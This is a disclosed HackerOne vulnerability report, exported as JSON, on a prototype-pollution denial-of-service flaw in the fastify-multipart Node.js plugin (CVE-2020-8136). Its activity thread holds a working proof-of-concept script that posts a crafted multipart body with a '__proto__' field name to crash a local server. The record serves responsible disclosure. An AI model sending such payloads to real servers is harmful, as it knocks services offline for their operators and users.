{"id":804772,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MDQ3NzI=","url":"https://hackerone.com/reports/804772","title":"Prototype pollution in multipart parsing","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-02-25T17:51:30.156Z","submitted_at":"2020-02-25T17:51:30.156Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mcollina","url":"/mcollina","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8136"],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-28T10:55:15.010Z","bug_reporter_agreed_on_going_public_at":"2020-02-28T10:55:14.945Z","team_member_agreed_on_going_public_at":"2020-02-28T08:01:26.479Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report a prototype pollution attack in fastify-multipart it allows to crash a remote server parsing multipart requests by sending a specially crafted request.\n\n# Module\n\n**module name:** fastify-multipart\n**version:** all versions before \u003c v1.0.5. v1.0.5 contains the fix. \n**npm page:** `https://www.npmjs.com/package/fastify-multipart`\n\n## Module Description\n\n[Fastify](https://www.fastify.io) plugin to parse the multipart content-type.\n\nUnder the hood it uses [busboy](http://npm.im/busboy).\n\n## Module Stats\n\nweekly downloads: 4900\n\n# Vulnerability\n\n## Vulnerability Description\n\nEran Hammer found this vulnerability for Hapi, he tested Fastify as well and found it vulnerable.\nHere is the Hapi vulnerability report: https://www.npmjs.com/advisories/1479. \n\n## Steps To Reproduce:\n\n\u003e Detailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.\n\n## Patch\n\nThis was already released in https://github.com/fastify/fastify-multipart/pull/116 and version 1.0.5 issued.\n\n# Wrap up\n\n\u003e Select Y or N for the following statements:\n\n- I contacted the maintainer to let them know: Y\n- I opened an issue in the related repository: N\n\nI just need a CVE issued.\n\n## Impact\n\nIt's a Denial of Service attack","vulnerability_information_html":"\u003cp\u003eI would like to report a prototype pollution attack in fastify-multipart it allows to crash a remote server parsing multipart requests by sending a specially crafted request.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e fastify-multipart\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e all versions before \u0026lt; v1.0.5. v1.0.5 contains the fix. \u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/fastify-multipart\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fwww.fastify.io\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eFastify\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e plugin to parse the multipart content-type.\u003c/p\u003e\n\n\u003cp\u003eUnder the hood it uses \u003ca href=\"/redirect?url=http%3A%2F%2Fnpm.im%2Fbusboy\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ebusboy\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003eweekly downloads: 4900\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eEran Hammer found this vulnerability for Hapi, he tested Fastify as well and found it vulnerable.\u003cbr\u003e\nHere is the Hapi vulnerability report: \u003ca title=\"https://www.npmjs.com/advisories/1479\" href=\"/redirect?url=https%3A%2F%2Fwww.npmjs.com%2Fadvisories%2F1479\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.npmjs.com/advisories/1479\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. \u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eDetailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eThis was already released in \u003ca title=\"https://github.com/fastify/fastify-multipart/pull/116\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ffastify%2Ffastify-multipart%2Fpull%2F116\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/fastify/fastify-multipart/pull/116\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and version 1.0.5 issued.\u003c/p\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eSelect Y or N for the following statements:\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: Y\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI just need a CVE issued.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIt\u0026#39;s a Denial of Service attack\u003c/p\u003e\n","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-03-29T08:01:26.561Z","allow_singular_disclosure_after":-23756064.794161864,"singular_disclosure_allowed":true,"vote_count":9,"voters":["a_d_a_m","saddeann","mygf","m359ah","b69fb2ebda43240ece9dbeb","guccipanda","mathematiker37","emha","lorigga"],"severity":{"rating":"critical","score":9.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":4647,"asset_type":"SOURCE_CODE","asset_identifier":"fastify","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7153804,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @mcollina and thanks for your report,\n\nDo you mind sharing with us a code snippet to test it, so I can give a severity, or since you already contacted the owner you want me to send directly to the team?\n\nThanks!\n@turtle_shell","markdown_message":"\u003cp\u003eHello \u003ca href=\"/mcollina\"\u003e@mcollina\u003c/a\u003e and thanks for your report,\u003c/p\u003e\n\n\u003cp\u003eDo you mind sharing with us a code snippet to test it, so I can give a severity, or since you already contacted the owner you want me to send directly to the team?\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003cbr\u003e\n\u003ca href=\"/turtle_shell\"\u003e@turtle_shell\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-26T09:45:28.769Z","updated_at":"2020-02-26T09:45:28.769Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7154497,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"I am the owner of this module. As I said, I just need a CVE.\n\n```\nconst http = require('http')\nconst fastify = require('fastify')()\nconst options = {\n    addToBody: true,\n    onFile: (fieldName, stream, filename, encoding, mimetype, body) =\u003e {\n        stream.resume();\n    }\n};\nfastify.register(require('fastify-multipart'), options);\nfastify.post('/', function (req, reply) {\n    console.log(req.body.toString());\n    reply.code(200).send();\n});\nfastify.listen(3000, () =\u003e {\n    console.log(`server listening on ${fastify.server.address().port}`)\n    const body =\n        '--AaB03x\\r\\n' +\n        'content-disposition: form-data; name=\"__proto__\"; filename=\"file1.txt\"\\r\\n' +\n        'Content-Type: text/plain\\r\\n' +\n        '\\r\\n' +\n        '... contents of file1.txt ...\\r\\r\\n' +\n        '--AaB03x--\\r\\n';\n    const r = {\n        hostname: 'localhost',\n        port: 3000,\n        path: '/',\n        method: 'POST',\n        headers: {\n            'content-type': 'multipart/form-data; boundary=AaB03x'\n        }\n    };\n    const req = http.request(r, (res) =\u003e { });\n    req.write(body);\n    req.end();\n});\n```\n\n","markdown_message":"\u003cp\u003eI am the owner of this module. As I said, I just need a CVE.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003econst http = require(\u0026#39;http\u0026#39;)\nconst fastify = require(\u0026#39;fastify\u0026#39;)()\nconst options = {\n    addToBody: true,\n    onFile: (fieldName, stream, filename, encoding, mimetype, body) =\u0026gt; {\n        stream.resume();\n    }\n};\nfastify.register(require(\u0026#39;fastify-multipart\u0026#39;), options);\nfastify.post(\u0026#39;/\u0026#39;, function (req, reply) {\n    console.log(req.body.toString());\n    reply.code(200).send();\n});\nfastify.listen(3000, () =\u0026gt; {\n    console.log(`server listening on ${fastify.server.address().port}`)\n    const body =\n        \u0026#39;--AaB03x\\r\\n\u0026#39; +\n        \u0026#39;content-disposition: form-data; name=\u0026quot;__proto__\u0026quot;; filename=\u0026quot;file1.txt\u0026quot;\\r\\n\u0026#39; +\n        \u0026#39;Content-Type: text/plain\\r\\n\u0026#39; +\n        \u0026#39;\\r\\n\u0026#39; +\n        \u0026#39;... contents of file1.txt ...\\r\\r\\n\u0026#39; +\n        \u0026#39;--AaB03x--\\r\\n\u0026#39;;\n    const r = {\n        hostname: \u0026#39;localhost\u0026#39;,\n        port: 3000,\n        path: \u0026#39;/\u0026#39;,\n        method: \u0026#39;POST\u0026#39;,\n        headers: {\n            \u0026#39;content-type\u0026#39;: \u0026#39;multipart/form-data; boundary=AaB03x\u0026#39;\n        }\n    };\n    const req = http.request(r, (res) =\u0026gt; { });\n    req.write(body);\n    req.end();\n});\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-02-26T11:43:47.520Z","updated_at":"2020-02-26T11:43:47.520Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7173383,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-28T08:00:57.407Z","updated_at":"2020-02-28T08:00:57.407Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"mcollina","url":"/mcollina"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7173384,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Let's disclose. I will request a CVE once it's disclosed.","markdown_message":"\u003cp\u003eLet\u0026#39;s disclose. I will request a CVE once it\u0026#39;s disclosed.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-28T08:01:26.493Z","updated_at":"2020-02-28T08:01:26.493Z","first_to_agree":true,"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7174603,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-28T10:55:14.966Z","updated_at":"2020-02-28T10:55:14.966Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7174604,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-28T10:55:15.028Z","updated_at":"2020-02-28T10:55:15.028Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}